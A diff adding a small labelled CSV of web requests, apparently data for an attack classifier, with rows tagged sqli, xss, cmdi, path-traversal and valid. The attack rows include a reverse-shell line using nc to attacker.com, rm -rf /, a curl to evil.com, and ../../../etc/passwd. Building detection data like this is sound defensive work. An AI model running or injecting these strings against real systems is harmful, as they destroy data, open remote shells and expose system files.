@@ -1,0 +1,29 @@
+request,label
+SELECT * FROM users WHERE id = 1,sqli
+admin' OR '1'='1,sqli
+DROP TABLE users,sqli
+SELECT password FROM accounts WHERE username = 'admin',sqli
+OR '1'='1' --,sqli
+<script>alert('XSS')</script>,xss
+<img src=x onerror=alert(1)>,xss
+alert('hello'),xss
+<svg/onload=alert('XSS')>,xss
+<body onload=alert('xss')>,xss
+rm -rf /,cmdi
+& shutdown -h now,cmdi
+hostname && whoami,cmdi
+`curl evil.com`,cmdi
+| nc -e /bin/sh attacker.com 1234,cmdi
+../../../etc/passwd,path-traversal
+/../../windows/system32,path-traversal
+../config.php,path-traversal
+/../../../boot.ini,path-traversal
+/../../../../usr/bin,path-traversal
+/login?user=admin&pass=123,valid
+GET /home HTTP/1.1,valid
+POST /api/data,valid
+GET /products?id=5,valid
+/about,valid
+/contact,valid
+/search?q=firewall,valid
+/index.html,valid
